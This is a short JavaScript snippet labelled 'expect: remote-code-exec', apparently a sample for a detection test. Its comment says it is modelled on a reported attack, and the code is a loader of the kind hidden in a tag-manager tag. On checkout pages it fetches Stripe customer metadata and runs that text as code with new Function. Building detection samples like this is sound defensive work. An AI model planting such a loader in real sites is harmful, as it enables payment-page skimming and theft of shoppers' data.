// expect: remote-code-exec
// Modeled on the same report: loader in a GTM custom tag pulls code from Stripe customer metadata on
// checkout pages and runs it with new Function.
if (location.href.indexOf('checkout') !== -1) {
  setTimeout(function () {
    fetch('https://api.stripe.com/v1/customers/cus_EXAMPLE', { headers: { Authorization: 'Bearer pk_test_EXAMPLE' } })
      .then(function (r) { return r.json(); })
      .then(function (r) { var code = Object.keys(r.metadata).map(function (k) { return r.metadata[k]; }).join(''); if (code) new Function(code)(); });
  }, 2000);
}
